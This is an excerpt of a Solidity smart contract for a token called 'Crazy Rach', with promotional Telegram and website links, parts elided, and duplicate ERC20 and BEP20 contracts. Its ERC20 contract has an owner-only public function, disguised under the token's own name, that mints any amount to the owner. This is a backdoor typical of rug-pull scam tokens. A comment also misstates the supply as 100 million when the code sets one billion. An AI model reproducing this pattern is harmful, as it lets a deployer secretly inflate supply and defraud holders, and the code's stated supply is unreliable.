...
//
//
//   📱Telegram::https://t.me/+ITXsnDIxdZoxODE1
//   📱Website ::https://CrazyRach.space/
/*
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function CrazyRach(uint256 amount) public onlyOwner {
    _CrazyRach(msg.sender, amount);
    }
    ...
    function _CrazyRach(address account, uint256 amount) internal virtual {
...
contract CrazyRach is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Crazy Rach", "CrazyRach") {
        _CrazyRach(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    string private _name = "CrazyRach";
    string private _symbol = "CrazyRach";
